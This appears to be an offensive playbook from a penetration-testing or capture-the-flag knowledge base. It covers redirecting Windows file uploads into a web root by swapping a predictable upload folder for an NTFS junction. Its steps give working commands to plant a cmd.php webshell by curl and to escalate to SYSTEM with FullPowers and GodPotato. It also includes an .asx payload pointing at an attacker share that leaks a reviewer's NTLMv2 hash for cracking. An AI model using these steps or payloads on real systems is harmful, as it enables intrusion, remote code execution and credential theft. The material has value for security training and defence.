# File Upload — NTFS Junction Write Redirect (Windows)

## When this applies

- Windows target with file upload functionality that writes to a *predictable per-user / per-request subdirectory*.
- You have an interactive (SSH/RDP) foothold as a low-priv user but the web service runs as a different account (IIS/Apache typically runs as `LOCAL SERVICE` / `IIS APPPOOL\<x>` / `NETWORK SERVICE`).
- The upload sink directory has no extension/MIME filter, but the upload path is *not* the web root — the server stores files outside `htdocs/wwwroot` and serves them from a separate route (or doesn't serve them at all).
- Goal: redirect a future upload into the web root (or any directory the foothold user can't write to directly) by replacing an attacker-controlled subdirectory with an NTFS *reparse point* (junction) before the file lands.

## Why this works

NTFS junctions (`mklink /J`, or `New-Item -ItemType Junction`) are directory-level reparse points — when a process writes to `C:\path\with\junction\file.txt`, the kernel resolves the junction and the actual write happens in the target directory. Unlike symbolic links, junctions are local-only, do not require `SeCreateSymbolicLinkPrivilege`, and any user who *owns* a directory can convert it to a junction. The file-server process performs `move_uploaded_file` / `File.Copy` *after* the junction has been planted — it follows the reparse and writes into the target with the file-server's effective permissions.

## Pre-requisite: predictable sink path

Read the upload handler's source — find how the per-request directory is named:

```php
$folderName = md5($firstname . $lastname . $email);   // fully attacker controlled — pre-computable offline
$folderName = $_SESSION['user_id'];                    // generally not attacker controlled, but visible
$folderName = bin2hex(random_bytes(8));                // random — junction trick fails, look for a different primitive
```

If the folder name is fully attacker-derived, you can pre-compute it offline (one PowerShell line for MD5: `[System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($s))).Replace("-","").ToLower()`).

## Steps

### 1. Pre-stage the per-user folder

Submit a normal upload via the web form using the chosen `firstname/lastname/email` triple. The PHP/ASP.NET handler creates `C:\Windows\Tasks\Uploads\<md5>\` with `mkdir(... 0777, true)` (or equivalent) and writes the dummy file. Owner: typically the web-service account, but on PHP/Apache the `mkdir(...,0777)` call sets the directory ACL to allow Everyone:F, so the foothold user can delete and replace it.

### 2. Delete the empty folder via SSH

```cmd
:: From the SSH/RDP foothold
rmdir /S /Q C:\Windows\Tasks\Uploads\<md5>
```

If `rmdir` fails with "Access denied" the directory ACL doesn't grant Delete to your foothold user — fall back to the source-code path or look for an alternative folder-renaming primitive.

### 3. Replace the path with a junction

```powershell
# PowerShell (preferred — avoids cmd /J switch parsing):
New-Item -ItemType Junction -Path "C:\Windows\Tasks\Uploads\<md5>" -Target "C:\xampp\htdocs"
```

```cmd
:: cmd alternative — note SSH-over-shell may eat /J as a switch:
mklink /J "C:\Windows\Tasks\Uploads\<md5>" "C:\xampp\htdocs"
```

Verify: `dir C:\Windows\Tasks\Uploads\<md5>` should show the *target's* contents and the directory listing flags it as `<JUNCTION>` (or `d----l` in PowerShell `Get-Item`).

### 4. Re-upload — your file lands in the web root

Submit another upload with the *same* `firstname/lastname/email` triple. The handler computes the same MD5, sees the directory already exists (via the junction), `move_uploaded_file` follows the reparse, and the file lands in `C:\xampp\htdocs\<sanitized-name>`.

```bash
curl -s -X POST http://target/ \
  -F "firstname=Evil" -F "lastname=Junction" -F "email=evil@junction.test" \
  -F "fileToUpload=@cmd.php" -F "submit=Upload File"
# Now reachable at http://target/cmd.php — executes as the web-service account
```

## Common gotchas

- **`mkdir(..., 0777, true)` race** — between step 1 and step 3, an HR-bot or cleanup task may delete or recreate the folder. Run steps 2–4 in immediate sequence.
- **Junction targets must be local NTFS volumes.** Cross-volume targets fail silently — `mklink /J` returns success but the reparse data is invalid. Verify with `fsutil reparsepoint query <path>`.
- **The web-service account must have *write* on the target directory.** `icacls C:\xampp\htdocs` should include `LOCAL SERVICE:(F)` or equivalent. If only Administrators can write the target, the upload still fails — pick a different target (`C:\Windows\Tasks\`, `C:\Users\Public\`, `C:\xampp\htdocs\`).
- **Don't junction over `cgi-bin` if Apache `Options FollowSymLinks` is disabled** — Apache will refuse to traverse the reparse point. Plain `htdocs` works because PHP execution happens via `mod_php`, not via separate child processes.
- **PHP `realpath()` may resolve through the junction before the file write.** If the handler uses `realpath($targetDir)` and compares against the configured `$uploadDir` prefix, the junction is detected and rejected. Most simple custom handlers don't do this.

## Combos

- **+ FullPowers + Potato (Windows)**: After landing a webshell as stripped LOCAL SERVICE, run `FullPowers.exe -c "GodPotato.exe -cmd \"cmd /c type root.txt\""` to escalate to SYSTEM. See [potatoes-sanity-check.md](../../../../system/reference/scenarios/windows-privesc/potatoes-sanity-check.md).
- **+ NTLM hash leak via WMP file upload**: When the upload handler ships uploaded files to a reviewer who opens them in WMP/Explorer, an `.asx` containing `<REF HREF="file://attacker/share/x.mp3"/>` leaks the reviewer's NTLMv2 hash. Crackable with `hashcat -m 5600`.

## Quick recipe (XAMPP / Apache + PHP upload handler)

1. SSH login as the foothold user with credentials from a prior leak/crack.
2. `Get-Content <uploadHandler>.php` — read upload handler, extract the configured upload base and folder-name formula.
3. Submit one upload with chosen attacker-controlled inputs to materialise the per-request directory.
4. SSH: `rmdir /S /Q <uploadBase>\<predicted-name>` then `New-Item -ItemType Junction -Path ... -Target <web-root>`.
5. Submit a `cmd.php` upload with the same input triple → request `http://<TARGET>/cmd.php?p=<command>` — RCE as the web-service account.
6. If only `SeTcb` is granted (no `SeImpersonate`), chain through `FullPowers.exe → GodPotato.exe → SYSTEM`.
